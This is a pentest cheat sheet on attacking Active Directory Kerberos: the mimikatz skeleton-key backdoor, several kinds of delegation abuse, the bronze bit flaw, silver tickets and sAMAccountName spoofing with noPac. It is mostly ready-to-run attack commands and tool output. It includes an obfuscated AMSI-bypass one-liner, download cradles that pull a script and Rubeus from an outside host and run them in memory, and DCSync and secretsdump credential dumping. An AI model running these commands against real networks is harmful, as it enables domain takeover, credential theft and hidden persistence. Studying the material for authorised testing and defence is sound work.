https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#kerberos-clock-synchronization
```


## Backdoors w/ mimikatz


### Overview
Along with maintaining access using golden and silver tickets mimikatz has one other trick up its sleeves when it comes to attacking Kerberos. Unlike the golden and silver ticket attacks a Kerberos backdoor is much more subtle because it acts similar to a rootkit by implanting itself into the memory of the domain forest allowing itself access to any of the machines with a master password.&#x20;

The Kerberos backdoor works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps. A skeleton key only works using Kerberos RC4 encryption.&#x20;

The default hash for a mimikatz skeleton key is 60BA4FCADC466C7A033C178194C03DF6 which makes the password "mimikatz"

### Skeleton Key Overview

The skeleton key works by abusing the AS-REQ encrypted timestamps. The timestamp is encrypted with the users NT hash. The domain controller then tries to decrypt this timestamp with the users NT hash, once a skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the skeleton key NT hash allowing you access to the domain forest.


### Skeleton Key

```bash
misc::skeleton
# ACCESING THE FOREST (default creds "mimikatz")
# The share will now be accessible without the need for Administrators password 
net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz
# access the directory of Desktop-1 without ever knowing what users have access
dir \\Desktop-1\c$ /user:Machine1 mimikatz
# Skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques.
```




## Delegations

> Kerberos delegations allow services to access other services on behalf of domain users.

[#kerberos-delegation](../../post-exploitation/windows/ad/exploitation.md#kerberos-delegation "mention")

```
https://en.hackndo.com/constrained-unconstrained-delegation/
https://beta.hackndo.com/unconstrained-delegation-attack/
https://beta.hackndo.com/resource-based-constrained-delegation-attack/
https://blog.harmj0y.net/activedirectory/s4u2pwnage/
https://eladshamir.com/2019/01/28/Wagging-the-Dog.html
https://github.com/TheManticoreProject/Delegations
```

???+ tip
    By default on windows active directory all domain controller are setup with unconstrained delegation

### Types of delegation 
The  "Kerberos" authentication protocol features delegation capabilities  described as follows. There are three types of Kerberos delegations
• Unconstrained delegations (KUD): a service can impersonate users on any other service.
• Constrained delegations (KCD): a service can impersonate users on a set of services
• Resource based constrained delegations (RBCD) : a set of services can impersonate users on a service

### Recon
From UNIX-like systems, Impacket's findDelegation (Python) script can be used to find unconstrained, constrained (with or without protocol transition) and rbcd.
`findDelegation.py "DOMAIN"/"USER":"PASSWORD"`

At the time of writing (13th October 2021), a Pull Request is pending to feature a -user filter to list delegations for a specific account.
`findDelegation.py -user "account" "DOMAIN"/"USER":"PASSWORD"`

From Windows systems, BloodHound can be used to identify unconstrained and constrained delegation.
The following queries can be used to audit delegations.
```powershell
// Unconstrained Delegation
MATCH (c {unconstraineddelegation:true}) return c
// Constrained Delegation (with Protocol Transition)
MATCH (c) WHERE NOT c.allowedtodelegate IS NULL AND c.trustedtoauth=true return c
// Constrained Delegation (without Protocol Transition)
MATCH (c) WHERE NOT c.allowedtodelegate IS NULL AND c.trustedtoauth=false return c
// Resource-Based Constrained Delegation
MATCH p=(u)-[:AllowedToAct]->(c) RETURN p
The Powershell Active Directory module also has a cmdlet that can be used to find delegation for a specific account.
Get-ADComputer "Account" -Properties TrustedForDelegation, TrustedToAuthForDelegation,msDS-AllowedToDelegateTo,PrincipalsAllowedToDelegateToAccount
```

### Unconstrained delegation
![](https://i.imgur.com/Em3AjYS.png)
```powershell
# Unconstrained Delegation
nxc ldap 192.168.0.104 -u harry -p pass --trusted-for-delegation
# With protocol transition ond RBCD as well
nxc smb serv01.testlab.local -u USER -p PASS --delegate administrator
nxc smb serv01.testlab.local -u USER -p PASS --delegate administrator --sam --lsa
# only S4U2Self in order to impersonate any account on a domain joined computer for which you know the credentials
nxc smb serv01.testlab.local -u USER -p PASS --delegate administrator --self
nxc smb serv01.testlab.local -u USER -p PASS --delegate administrator --self --dpapi

https://pentestlab.blog/2022/03/21/unconstrained-delegation/

# Find it on Bloodhound
MATCH (c {unconstraineddelegation:true}) return c
# unconstrained delegation system (out of domain controller) 
MATCH (c1:Computer)-[:MemberOf*1..]->(g:Group) WHERE g.objectid ENDS WITH '-516' WITH COLLECT(c1.name) AS domainControllers MATCH (c2 {unconstraineddelegation:true}) WHERE NOT c2.name IN domainControllers RETURN c2
# Use Rubeus but first bypass AMSI
$x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344)
(new-object system.net.webclient).downloadstring('http://192.168.56.126/amsi_rmouse.txt')|IEX
# Now launch Rubeus in memory with execute assembly
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.56.126/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data);
# First we will list the available tickets
[Rubeus.Program]::MainString("triage");
# Now if possible force a coerce of a DC to another DC in case no interesting tickets are found
python3 coercer.py -u arya.stark -d north.sevenkingdoms.local -p Needle -t kingslanding.sevenkingdoms.local -l winterfell
# Dump TGT
[Rubeus.Program]::MainString("dump /user:kingslanding$ /service:krbtgt /nowrap");
cat tgt.b64|base64 -d > ticket.kirbi
ticketConverter.py ticket.kirbi ticket.ccache
export KRB5CCNAME=/workspace/unconstrained/ticket.ccache
secretsdump.py -k -no-pass SEVENKINGDOMS.LOCAL/'KINGSLANDING$'@KINGSLANDING
```


### Constrained Delegation
![](https://i.imgur.com/ABEM2qy.png)
```powershell
# Find it on Bloodhound
MATCH p=(u)-[:AllowedToDelegate]->(c) RETURN p
# Or with impacket
findDelegation.py "DOMAIN"/"USER":"PASSWORD" (-target-domain $DOMAIN)
# With protocol transition (using Impacket or Rubeus)
getST -spn "cifs/target" -impersonate "administrator" "domain/AccountName:password"
.\Rubeus.exe asktgt /user:jon.snow /domain:north.sevenkingdoms.local /rc4:B8D76E56E9DAC90539AFF05E3CCB1755
.\Rubeus.exe s4u /ticket:put_the__previous_ticket_here /impersonateuser:administrator /msdsspn:"CIFS/target" /ptt
# And next we can use the TGS to connect to smb and get a shell with psexec, smbexec, wmiexec, …
# SPN part is not encrypted in the request, so you can change it to the one you want with the option altservice

# Without protocol transition, we need to add a computer first
addcomputer.py -computer-name 'rbcd_const$' -computer-pass 'rbcdpass' -dc-host 192.168.56.11 'DOMAIN'/'USER':'PASS'
# add rbcd from X (rbcd_const) to constrained (castelblack) using 
rbcd.py -delegate-from 'rbcd_const$' -delegate-to 'targetComputer$' -dc-ip 'DomainController' -action 'write' -hashes ':b52ee55ea1b9fb81de8c4f0064fa9301' 'domain'/'PowerfulUser'
# s4u2self + s4u2 proxy on X (rbcd_const)
getST.py -spn 'host/castelblack' -impersonate Administrator -dc-ip 'DomainController' 'DOMAIN'/'rbcd_const$':'rbcdpass'
# s4u2proxy from constrained (castelblack) to target (winterfell) - with altservice to change the SPN in use
getST.py -impersonate "administrator" -spn "http/winterfell" -altservice "cifs/winterfell" -additional-ticket 'administrator@host_castelblack@NORTH.SEVENKINGDOMS.LOCAL.ccache' -dc-ip 'DomainController' -hashes ':b52ee55ea1b9fb81de8c4f0064fa9301' 'domain'/'castelblack$'
export KRB5CCNAME=administrator@....LOCAL.ccache 
wmiexec.py -k -no-pass 'domain'/administrator@'targetComputerHostname'
# After the exploit a little clean up of the lab, flush the rbcd entry and delete the computer account with a domain admin
rbcd.py -delegate-to 'castelblack$' -delegate-from 'rbcd_const$' -dc-ip 'DomainController' -action 'flush' -hashes ':b52ee55ea1b9fb81de8c4f0064fa9301' 'DOMAIN'/'castelblack$'
addcomputer.py -computer-name 'rbcd_const$' -computer-pass 'rbcdpass' -dc-host 'DomainController' 'dnorth.sevenkingdoms.local/eddard.stark:FightP3aceAndHonor!' -delete

getST.py -spn WWW/dc.domain.com -impersonate Administrator domain.com/svc_machine -hashes :4fded14079fe2667c67f2b43fd6cb57b
```
> With protocol transition
```powershell
From UNIX-like systems, Impacket's getST (Python) script can be used for that purpose.

getST -spn "cifs/target" -impersonate "Administrator" "$DOMAIN"/"$USER":"$PASSWORD"

[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
[-] Probably SPN is not allowed to delegate by user user1 or initial TGT not forwardable

When attempting to exploit that technique, if the error above triggers, it means that either

    the account was sensitive for delegation, or a member of the "Protected Users" group.
    or the constrained delegations are configured without protocol transition
    
From Windows machines, Rubeus (C#) can be used to conduct a full S4U2 attack (S4U2self + S4U2proxy).

Rubeus.exe s4u /nowrap /msdsspn:"cifs/target" /impersonateuser:"administrator" /domain:"domain" /user:"user" /password:"password"
```

### RBCD 
> Resource-Based Constrained Delegation

![](https://www.thehacker.recipes/assets/RBCD%20mindmap.rbocZNrR.png)

You can abuse RBCD when you can edit the attribute : _**msDS-AllowedToActOnBehalfOfOtherIdentity**_

* An example of exploitation is when you got GenericAll or GenericWrite ACL on a Computer.

```bash
https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution
https://pentestbook.six2dez.com/post-exploitation/windows/ad/kerberos-attacks#info
https://github.com/tothi/rbcd-attack

############ PREREQUISITES
- Domain account with write access to the target computer
- Permission to create new computer accounts (this is usually default, see if MachineAccountQuota > 0)
nxc ldap TARGET_COMPUTER -u user -p password -M maq
ldapsearch -x -H ldap://TARGET_IP -D 'user@dom.com' -w '' -b "DC=DOM,DC=COM" | grep -i "ms-DS-MachineAccountQuota"
Get-DomainObject -Identity "dc=offense,dc=local" -Domain offense.local | Select ms-DS-MachineAccountQuota
- DC to be running at least Windows 2012
- The target computer WS01 object must not have the attribute msds-allowedtoactonbehalfofotheridentity set:
Get-NetComputer ws01 | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
ldapsearch -x -H ldap://TARGET_IP -D 'user@dom.com' -w '' -b "DC=DOM,DC=COM" | grep -i msds-allowedtoactonbehalfofotheridentity
- LDAP (389/tcp) and SAMR (445/tcp) (or LDAPS (636/tcp)) Kerberos (88/tcp) access to the DC.

# ADD COMPUTER ACCOUNT (PS)
custom_prompt> . .\Powermad.ps1
custom_prompt> echo $error
custom_prompt> New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
[+] Machine account attackersystem added
custom_prompt> $ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
custom_prompt> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)custom_prompt> custom_prompt> 
custom_prompt> Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}



# CHECK MAQ
nxc ldap $DC_IP -u $USER -p $PASS -M maq
...
MAQ         172.16.2.6      389    DC02             [*] Getting the MachineAccountQuota
MAQ         172.16.2.6      389    DC02             MachineAccountQuota: 10

# FIRST, WE ADD A FAKE COMPUTER
└─$ addcomputer.py -computer-name 'attackersystem$' -computer-pass 'Summer2018!' 'dom.com'/'joe' -no-pass                                                                                                                                                                      
[*] Successfully added machine account attackersystem$ with password Summer2018!.    

# NOW WE PERFORM RBCD TO ASSIGN DELEGATION RIGHTS ON attackersystem$ over DC02$
# IMPORTANT: USER HAS DONOTREQPWD SO 'dom.com/user:' -k and then input empty password, do not use a ticket or .ccache since we can provide empty password this way
└─$ rbcd.py -delegate-from 'attackersystem2$' -delegate-to 'DC02$' -action 'write' 'dom.com/user:' -k -dc-ip $DC_IP                                                                         
[*] No credentials supplied, supply password                                                                                                                                 
Password:                                                                                                                                                                    
[-] CCache file is not found. Skipping...                                                                                                                                    
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty                                                                                                              
[*] Delegation rights modified successfully!                                                                                                                                 
[*] rbcd$ can now impersonate users on DC02$ via S4U2Proxy                                                                                                                   
[*] Accounts allowed to act on behalf of other identity:  
[*]     attackersystem$   (S-1-5-21-1416445593-394318334-2645530166-12602)  


# Now provide empty password the same way again when we get the ticket:
└─$ getST.py -spn 'cifs/dc02.dom.com' -impersonate 'administrator' 'dom.com/attackersystem$:Summer2018!'
[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_dc02.dev.admin.offshore.com@DEV.ADMIN.OFFSHORE.COM.ccache

export KRB5CCNAME='administrator@cifs_dc02.XXX.ccache'

klist
Ticket cache: FILE:administrator@cifs_dc02.XXX.ccache
Default principal: administrator@dom.com

Valid starting       Expires              Service principal
06/17/2025 17:24:49  06/18/2025 03:24:49  cifs/dc02.dom.com@DOM.COM
        renew until 06/18/2025 17:24:49

# We can dump hashes with that ticket
secretsdump.py dom.com/administrator@dc02.dom.com -k -no-pass
# A SHORTER OPTION IS
secretsdump.py @dc.domain.com -k -no-pass

                                  
# Now we can authenticate as Administrator using that Kerberos ticket with no password. NOTE: dc.domain.com is needed after @
psexec.py domain.com/Administrator@dc.domain.com -k -no-pass
impacket-psexec -k -no-pass dc.domain.com -dc-ip $DC_IP 
wmiexec.py -k -no-pass @targetdc.domain.local
# After the exploit a little clean up of the lab, flush the rbcd entry and delete the computer account with a domain admin
rbcd.py -delegate-from 'rbcd$' -delegate-to 'targetComputer$' -dc-ip 'DomainController' -action 'flush' 'domain'/'PowerfulUser':'password'
addcomputer.py -computer-name 'rbcd$' -computer-pass 'rbcdpass' -dc-host kingslanding.sevenkingdoms.local 'DOMAIN_ACQUIRED'/'user':'password' -delete
```

### The bronze bit vuln 
In some cases, the delegation will not work. Depending on the context, the bronze bit vulnerability (CVE-2020-17049) can be used to try to bypass restrictions.
The Bronze bit vulnerability (CVE-2020-17049) introduced the possibility of forwarding service tickets when it shouldn't normally be possible (protected users, unconstrained delegation, constrained delegation configured with protocol transition).
![](https://i.imgur.com/nbxyIGO.png)

When abusing Kerberos delegations, S4U extensions usually come into play\. One of those extensions is S4U2proxy\. [Constrained](https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained)
and [Resource-Based Constrained](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd)
delegations rely on that extensions\. A requirement to be able to use  S4U2proxy is to use an additional service ticket as evidence \(usually  issued by after S4U2self request\)\. That ticket needs to have the forwardableflag set\. 

There are a few reasons why that flag wouldn't be set on a ticket
-  the "impersonated" user was member of the "Protected Users" group or was configured as "sensitive for delegation"
-  the service account configured for [constrained delegation](https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained)
was configured for [Kerberos only/without protocol transition](https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained#without-protocol-transition)

In 2020, the "bronze bit" \(CVE\-2020\-17049\) was released, allowing attackers to edit a ticket and set the forwardableflag\.
```powershell
 getST.py -force-forwardable -spn "$Target_SPN" -impersonate
"Administrator" -dc-ip "$DC_HOST" -hashes :"$NT_HASH"
"$DOMAIN"/"$USER" 
 ```



### Resources - go further


```bash
    https://www.thehacker.recipes/ad/movement/kerberos/delegations
    https://www.notsoshant.io/blog/attacking-kerberos-constrained-delegation/
    https://sensepost.com/blog/2020/chaining-multiple-techniques-and-tools-for-domain-takeover-using-rbcd/
    https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse
    https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/delegation-abuse
    Charlie’s talk about delegation : https://www.thehacker.recipes/ad/movement/kerberos/delegations#talk
```


## Machine account to Domain Admin 
> Silver Ticket???

A machine account isn’t automatically an administrator on the server it’s linked to. However, I can leverage how Kerberos works to escalate to Administrator.

During a service ticket request, the service ticket is encrypted by the KDC using the key (NT hash) of the account running the service (the machine account). This allows only the service account to decrypt the ticket and authorize access.

I extracted the password hash of the service account CISRVPGLPI01$. With this, I can forge a service ticket by crafting the ticket’s content to gain access to the service without contacting the KDC. This forged ticket is known as a Silver Ticket.

It’s possible to create a Silver Ticket on Linux using Impacket’s ticketer.py tool.


```bash
ticketer.py -nthash b038f001e59a26d243f13479a2bf2893 -domain-sid S-1-5-21-578904490-1941284195-2359538415 -domain citadelle.ci -spn CIFS/CISRVPGLPI01.citadelle.ci Administrator -user-id 500
```


## sAMAccountName spoofing
> In November 2021, two vulnerabilities caught the attention of many  security researchers as they could allow domain escalation from a  standard user.

[https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing](https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing)

### CVE-2021-42278 - Name impersonation 
Computer accounts should have a trailing $ in their name (i.e. sAMAccountName  attribute) but no validation process existed to make sure of it. Abused  in combination with CVE-2021-42287, it allowed attackers to impersonate  domain controller accounts.

### CVE-2021-42287 - KDC bamboozling 
When requesting a Service Ticket, presenting a TGT is required first. When the service ticket is asked for is not found by the KDC, the KDC automatically searches again with a trailing $. What happens is that if a TGT is obtained for bob, and the bob user gets removed, using that TGT to request a service ticket for another user to himself (S4U2self) will result in the KDC looking for bob$ in AD. If the domain controller account bob$ exists, then bob (the user) just obtained a service ticket for bob$ (the domain controller account) as any other user
The ability to edit a machine account's sAMAccountName and servicePrincipalName  attributes is a requirement to the attack chain. The easiest way this  can be achieved is by creating a computer account (e.g. by leveraging  the MachineAccountQuota  domain-level attribute if it's greater than 0). The creator of the new  machine account has enough privileges to edit its attributes.  Alternatively, taking control over the owner/creator of a computer  account should do the job.
The attack can then be conducted as follows.
1. Clear the controlled machine account servicePrincipalName attribute of any value that points to its name (e.g. host/machine.domain.local, RestrictedKrbHost/machine.domain.local)
2. Change the controlled machine account sAMAccountName to a Domain Controller's name without the trailing $ -> CVE-2021-42278
3. Request a TGT for the controlled machine account
4. Reset the controlled machine account sAMAccountName to its old value (or anything else different than the Domain Controller's name without the trailing $)
5. Request a service ticket with S4U2self by presenting the TGT obtained before -> CVE-2021-42287
6. Get access to the domain controller (i.e. DCSync)

### Machine Account 
```powershell
# 0. create a computer account
addcomputer.py -computer-name 'ControlledComputer$' -computer-pass 'ComputerPassword' -dc-host DC01 -domain-netbios domain 'domain.local/user1:complexpassword'

# 1. clear its SPNs
addspn.py --clear -t 'ControlledComputer$' -u 'domain\user' -p 'password' 'DomainController.domain.local'

# 2. rename the computer (computer -> DC)
renameMachine.py -current-name 'ControlledComputer$' -new-name 'DomainController' -dc-ip 'DomainController.domain.local' 'domain.local'/'user':'password'

# 3. obtain a TGT
getTGT.py -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController':'ComputerPassword'

# 4. reset the computer name
renameMachine.py -current-name 'DomainController' -new-name 'ControlledComputer$' 'domain.local'/'user':'password'

# 5. obtain a service ticket with S4U2self by presenting the previous TGT
KRB5CCNAME='DomainController.ccache' getST.py -self -impersonate 'DomainAdmin' -altservice 'cifs/DomainController.domain.local' -k -no-pass -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController'

# 6. DCSync by presenting the service ticket
KRB5CCNAME='DomainAdmin.ccache' secretsdump.py -just-dc-user 'krbtgt' -k -no-pass -dc-ip 'DomainController.domain.local' @'DomainController.domain.local'


https://github.com/Ridter/noPac
# noPac.py (Python) is an automated alternative that can be used to scan and abuse unpatched targets from a UNIX-like environnment.
scanner.py $DOMAIN/$USERNAME:$PASSWORD -dc-ip $DC_IP
noPac.py $DOMAIN/$USERNAME:$PASSWORD -dc-ip $DC_IP --impersonate Administrator -dump


# 0. create a computer account
$password = ConvertTo-SecureString 'ComputerPassword' -AsPlainText -Force
New-MachineAccount -MachineAccount "ControlledComputer" -Password $($password) -Domain "domain.local" -DomainController "DomainController.domain.local" -Verbose

# 1. clear its SPNs
Set-DomainObject -Identity 'ControlledComputer$' -Clear 'serviceprincipalname' -Verbose

# 2. rename the computer (computer -> DC)
Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "DomainController" -Attribute samaccountname -Verbose

# 3. obtain a TGT
Rubeus.exe asktgt /user:"DomainController" /password:"ComputerPassword" /domain:"domain.local" /dc:"DomainController.domain.local" /nowrap

# 4. reset the computer name
Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "ControlledComputer" -Attribute samaccountname -Verbose

# 5. obtain a service ticket with S4U2self by presenting the previous TGT
Rubeus.exe s4u /self /impersonateuser:"DomainAdmin" /altservice:"ldap/DomainController.domain.local" /dc:"DomainController.domain.local" /ptt /ticket:[Base64 TGT]

# 6. DCSync
(mimikatz) lsadump::dcsync /domain:domain.local /kdc:DomainController.domain.local /user:krbtgt

https://github.com/cube0x0/noPac
# noPac (C#) is an automated alternative that can be used to scan and abuse unpatched targets.
noPac.exe scan -domain domain.local -user "lowpriv" -pass "lowpriv"
noPac.exe -domain mcafeelab.local -user "lowpriv" -pass "lowpriv" /dc dc.domain.local /mAccount pillemann11 /mPassword pilleman11 /service ldaps /ptt /impersonate Administrator
(mimikatz) lsadump::dcsync /domain:mcafeelab.local /all
```

### User account 
An alternative to using computer accounts is to have enough permissions against a user account \(cf\. [Access Controls abuse](https://www.thehacker.recipes/ad/movement/dacl/)\) to edit its sAMAccountNameattribute \(i\.e\. WritePropertyon the attribute, or on the « general information » or « public information » property sets, or GenericWrite, or GenericAll\)\.

This  attack path also requires knowledge of the user account password or  hash \(to obtain a TGT\), which can be obtained \(or set\) in many ways  \(e\.g\. [Targeted Kerberoasting](https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting), [Shadow Credentials](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials)
, [Forced Password Change](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword)\)\.

Appart from the computer account creation and SPNs manipulation, the exploitation steps are the same as with a [machine account](https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing#machine-account)\. If the account has SPNs that point to its name, they will have to be removed for the renaming operation to work\.
